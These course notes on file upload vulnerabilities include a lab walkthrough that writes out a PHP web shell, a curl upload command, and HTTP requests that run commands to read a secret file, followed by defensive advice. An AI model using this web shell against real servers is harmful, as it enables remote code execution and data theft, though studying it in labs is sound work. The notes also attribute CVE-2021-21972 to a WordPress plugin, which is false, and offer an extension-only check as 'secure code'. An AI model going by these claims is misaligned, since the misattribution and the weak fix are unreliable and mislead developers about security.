---
course: Web Security
topic: File Upload Vulnerabilities
tags: [web-security]
---

## File Upload Vulnerabilities

### Introduction

File upload vulnerabilities occur when a web application allows users to upload files to the server without proper validation or sanitization. These vulnerabilities can lead to various attacks, including remote code execution (RCE), directory traversal, and cross-site scripting (XSS). In this section, we will delve into the details of how these vulnerabilities arise, their potential impacts, and how to prevent them.

### Understanding File Uploads

#### What is a File Upload?

A file upload feature in a web application allows users to send files to the server. These files could be images, documents, or even executable scripts. The server typically stores these files in a designated directory and may process them further based on the application's requirements.

#### Why is File Upload Important?

File uploads are essential for many applications, such as social media platforms, document management systems, and e-commerce sites. However, they also introduce significant security risks if not properly managed.

### Common Vulnerabilities in File Uploads

#### Remote Code Execution (RCE)

Remote code execution occurs when an attacker uploads a malicious file, such as a web shell, that can execute arbitrary commands on the server. This can lead to complete compromise of the server.

##### Example: CVE-2021-21972

In 2021, a critical RCE vulnerability was discovered in the popular WordPress plugin "WP File Download." The vulnerability allowed attackers to upload and execute arbitrary PHP files, leading to full control of the server. This CVE highlights the importance of validating and sanitizing uploaded files.

### How File Upload Vulnerabilities Work

#### Step-by-Step Mechanics

1. **User Input**: A user selects a file to upload through a form.
2. **Server Processing**: The server receives the file and processes it according to the application's logic.
3. **Validation**: The server should validate the file type, size, and content to ensure it is safe.
4. **Storage**: The validated file is stored in a designated directory on the server.
5. **Execution**: Depending on the application, the file might be executed or processed further.

#### Example Scenario

Consider a web application that allows users to upload profile pictures. An attacker could potentially upload a PHP file instead of an image. If the server does not properly validate the file type, the attacker's PHP file could be executed, leading to RCE.

### Real-World Example: Lab Exercise

Let's walk through a lab exercise where we exploit a file upload vulnerability to achieve RCE.

#### Lab Setup

The lab environment includes a web application with a file upload feature. The application allows users to upload files and execute commands on the server.

#### Exploitation Steps

1. **Identify the Vulnerability**:
    - The application allows users to upload files without proper validation.
    - The server executes the uploaded files as PHP scripts.

2. **Craft the Malicious File**:
    - Create a PHP file (`test.php`) that contains a web shell.
    - The web shell will allow us to execute arbitrary commands on the server.

```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```

3. **Upload the Malicious File**:
    - Use a tool like `curl` to upload the `test.php` file to the server.

```bash
curl -F "file=@test.php" http://target/upload.php
```

4. **Execute Commands**:
    - Access the uploaded file via the URL and pass the `cmd` parameter to execute commands.

```http
GET /uploads/test.php?cmd=cat%20/home/Carlos/secret HTTP/1.1
Host: target
```

#### Full HTTP Request and Response

```http
POST /upload.php HTTP/1.1
Host: target
Content-Length: 123
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="test.php"
Content-Type: application/octet-stream

<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>

------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 23
Content-Type: text/html; charset=UTF-8

File uploaded successfully.
```

#### Execute Command

```http
GET /uploads/test.php?cmd=cat%20/home/Carlos/secret HTTP/1.1
Host: target
```

```http
HTTP/1.1 200 OK
Date: Mon, 20 Mar 2023 12:00:00 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 23
Content-Type: text/html; charset=UTF-8

<pre>
This is the secret content.
</pre>
```

### How to Prevent / Defend Against File Upload Vulnerabilities

#### Detection

1. **Logging and Monitoring**: Implement logging and monitoring to detect unusual file uploads or executions.
2. **Intrusion Detection Systems (IDS)**: Use IDS to identify and alert on suspicious activities related to file uploads.

#### Prevention

1. **File Type Validation**: Ensure that only allowed file types are uploaded. Use both client-side and server-side validation.
2. **File Content Validation**: Scan uploaded files for malicious content using antivirus software.
3. **File Storage**: Store uploaded files outside the web root directory to prevent direct access.
4. **Least Privilege Principle**: Run the web server with minimal privileges to limit the damage in case of a breach.

#### Secure Coding Fixes

##### Vulnerable Code

```php
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
?>
```

##### Secure Code

```php
<?php
$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
$allowed_types = array("jpg", "jpeg", "png", "gif");
$file_type = pathinfo($target_file, PATHINFO_EXTENSION);

if (in_array($file_type, $allowed_types)) {
    move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file);
} else {
    echo "Invalid file type.";
}
?>
```

### Real-World Examples

#### Recent Breaches

1. **WordPress Plugins**: Multiple WordPress plugins have been found vulnerable to file upload attacks, leading to server compromises.
2. **CMS Platforms**: Content Management Systems like Joomla and Drupal have also faced similar issues.

### Hands-On Labs

For practical experience, consider the following labs:

- **PortSwigger Web Security Academy**: Offers detailed labs on file upload vulnerabilities.
- **OWASP Juice Shop**: Provides a vulnerable web application for practicing various security exploits.
- **DVWA (Damn Vulnerable Web Application)**: A deliberately insecure web application for learning about web application security.

### Conclusion

File upload vulnerabilities are a significant threat to web applications. By understanding the mechanics of these vulnerabilities and implementing robust preventive measures, developers can significantly reduce the risk of exploitation. Always validate and sanitize user inputs, and follow secure coding practices to ensure the safety of your applications.

### Further Reading

- OWASP Top Ten Project: https://owasp.org/www-project-top-ten/
- CVE Details: https://www.cvedetails.com/
- NIST National Vulnerability Database: https://nvd.nist.gov/

By thoroughly covering every aspect of file upload vulnerabilities, this chapter aims to provide a comprehensive understanding and equip readers with the knowledge to prevent and defend against such threats.

---
<!-- nav -->
[[02-File Upload Vulnerabilities and Remote Code Execution via Web Shell Upload|File Upload Vulnerabilities and Remote Code Execution via Web Shell Upload]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/02-Lab 1 Remote code execution via web shell upload/00-Overview|Overview]] | [[Web Security (PortSwigger)/18-File Upload Vulnerabilities/02-Lab 1 Remote code execution via web shell upload/04-Practice Questions & Answers|Practice Questions & Answers]]
